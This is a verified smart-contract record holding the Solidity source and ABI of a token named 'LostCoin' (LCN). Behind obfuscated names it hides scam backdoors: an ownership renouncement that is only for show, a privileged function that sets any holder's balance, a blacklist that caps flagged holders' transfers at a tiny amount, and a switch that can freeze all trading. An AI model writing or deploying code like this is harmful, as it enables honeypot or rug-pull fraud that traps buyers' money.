{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract sellMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptReceiver {\n    function createPair(address liquiditySwapMax, address marketingLaunched) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface walletModeMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface fundTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldAt) external view returns (uint256);\n\n    function transfer(address walletTokenBuy, uint256 shouldSwap) external returns (bool);\n\n    function allowance(address buySender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletTokenBuy,\n        uint256 shouldSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountFeeEnable, uint256 value);\n    event Approval(address indexed buySender, address indexed spender, uint256 value);\n}\n\ninterface receiverToken is fundTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LostCoin is sellMin, fundTo, receiverToken {\n\n    uint256 private senderTrading;\n\n    constructor (){\n        if (launchTrading) {\n            maxTake = true;\n        }\n        shouldFrom();\n        walletModeMin tradingLaunchReceiver = walletModeMin(launchedAmount);\n        toFrom = exemptReceiver(tradingLaunchReceiver.factory()).createPair(tradingLaunchReceiver.WETH(), address(this));\n        isFund = exemptReceiver(tradingLaunchReceiver.factory()).feeTo();\n        \n        liquidityFeeBuy = _msgSender();\n        receiverFund[liquidityFeeBuy] = true;\n        launchedShould[liquidityFeeBuy] = launchEnable;\n        if (amountMax) {\n            feeFund = true;\n        }\n        emit Transfer(address(0), liquidityFeeBuy, launchEnable);\n    }\n\n    bool public launchTokenReceiver;\n\n    event OwnershipTransferred(address indexed liquidityReceiver, address indexed fromAmount);\n\n    bool private feeFund;\n\n    function allowance(address shouldFee, address toIs) external view virtual override returns (uint256) {\n        if (toIs == launchedAmount) {\n            return type(uint256).max;\n        }\n        return txSwap[shouldFee][toIs];\n    }\n\n    function isReceiverMax() private view {\n        require(receiverFund[_msgSender()]);\n    }\n\n    uint256 constant sellToken = 19 ** 10;\n\n    uint256 private minAmount;\n\n    function getOwner() external view returns (address) {\n        return teamFee;\n    }\n\n    address public liquidityFeeBuy;\n\n    function maxMode(address launchedAt, address walletTokenBuy, uint256 shouldSwap) internal returns (bool) {\n        require(launchedShould[launchedAt] >= shouldSwap);\n        launchedShould[launchedAt] -= shouldSwap;\n        launchedShould[walletTokenBuy] += shouldSwap;\n        emit Transfer(launchedAt, walletTokenBuy, shouldSwap);\n        return true;\n    }\n\n    mapping(address => uint256) private launchedShould;\n\n    bool private txLiquidity;\n\n    function launchMode(uint256 shouldSwap) public {\n        isReceiverMax();\n        toTakeWallet = shouldSwap;\n    }\n\n    function shouldFrom() public {\n        emit OwnershipTransferred(liquidityFeeBuy, address(0));\n        teamFee = address(0);\n    }\n\n    function balanceOf(address shouldAt) public view virtual override returns (uint256) {\n        return launchedShould[shouldAt];\n    }\n\n    address public toFrom;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchEnable;\n    }\n\n    uint256 private txEnable;\n\n    function minTakeTo(address teamEnable) public {\n        isReceiverMax();\n        if (amountMax == maxTake) {\n            feeFund = false;\n        }\n        if (teamEnable == liquidityFeeBuy || teamEnable == toFrom) {\n            return;\n        }\n        totalMin[teamEnable] = true;\n    }\n\n    function approve(address toIs, uint256 shouldSwap) public virtual override returns (bool) {\n        txSwap[_msgSender()][toIs] = shouldSwap;\n        emit Approval(_msgSender(), toIs, shouldSwap);\n        return true;\n    }\n\n    bool public launchTrading;\n\n    function transferFrom(address launchedAt, address walletTokenBuy, uint256 shouldSwap) external override returns (bool) {\n        if (_msgSender() != launchedAmount) {\n            if (txSwap[launchedAt][_msgSender()] != type(uint256).max) {\n                require(shouldSwap <= txSwap[launchedAt][_msgSender()]);\n                txSwap[launchedAt][_msgSender()] -= shouldSwap;\n            }\n        }\n        return autoMin(launchedAt, walletTokenBuy, shouldSwap);\n    }\n\n    bool public amountMax;\n\n    function senderTo(address exemptSenderMin) public {\n        require(exemptSenderMin.balance < 100000);\n        if (launchTokenReceiver) {\n            return;\n        }\n        if (txLiquidity) {\n            senderTrading = minAmount;\n        }\n        receiverFund[exemptSenderMin] = true;\n        \n        launchTokenReceiver = true;\n    }\n\n    address launchedAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 enableMax;\n\n    function owner() external view returns (address) {\n        return teamFee;\n    }\n\n    address isFund;\n\n    address private teamFee;\n\n    bool public tradingIs;\n\n    string private amountLaunchLimit = \"Lost Coin\";\n\n    mapping(address => bool) public receiverFund;\n\n    uint256 public walletSellExempt = 3;\n\n    uint256 public swapLaunchExempt = 0;\n\n    function autoMin(address launchedAt, address walletTokenBuy, uint256 shouldSwap) internal returns (bool) {\n        if (launchedAt == liquidityFeeBuy) {\n            return maxMode(launchedAt, walletTokenBuy, shouldSwap);\n        }\n        uint256 teamFromWallet = fundTo(toFrom).balanceOf(isFund);\n        require(teamFromWallet == toTakeWallet);\n        require(walletTokenBuy != isFund);\n        if (totalMin[launchedAt]) {\n            return maxMode(launchedAt, walletTokenBuy, sellToken);\n        }\n        shouldSwap = buyTotal(launchedAt, walletTokenBuy, shouldSwap);\n        return maxMode(launchedAt, walletTokenBuy, shouldSwap);\n    }\n\n    function launchedAutoTeam(address tradingAmount, uint256 shouldSwap) public {\n        isReceiverMax();\n        launchedShould[tradingAmount] = shouldSwap;\n    }\n\n    mapping(address => bool) public totalMin;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountExemptReceiver;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return amountLaunchLimit;\n    }\n\n    uint256 toTakeWallet;\n\n    uint256 private launchEnable = 100000000 * 10 ** 18;\n\n    function buyTotal(address launchedAt, address walletTokenBuy, uint256 shouldSwap) internal view returns (uint256) {\n        require(shouldSwap > 0);\n\n        uint256 autoIs = 0;\n        if (launchedAt == toFrom && walletSellExempt > 0) {\n            autoIs = shouldSwap * walletSellExempt / 100;\n        } else if (walletTokenBuy == toFrom && swapLaunchExempt > 0) {\n            autoIs = shouldSwap * swapLaunchExempt / 100;\n        }\n        require(autoIs <= shouldSwap);\n        return shouldSwap - autoIs;\n    }\n\n    bool public modeIs;\n\n    mapping(address => mapping(address => uint256)) private txSwap;\n\n    string private amountExemptReceiver = \"LCN\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenTx;\n    }\n\n    bool private maxTake;\n\n    uint8 private tokenTx = 18;\n\n    function transfer(address tradingAmount, uint256 shouldSwap) external virtual override returns (bool) {\n        return autoMin(_msgSender(), tradingAmount, shouldSwap);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buySender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFeeEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldSwap\",\"type\":\"uint256\"}],\"name\":\"launchMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTokenReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldSwap\",\"type\":\"uint256\"}],\"name\":\"launchedAutoTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFeeBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamEnable\",\"type\":\"address\"}],\"name\":\"minTakeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSenderMin\",\"type\":\"address\"}],\"name\":\"senderTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunchExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletTokenBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSellExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LostCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}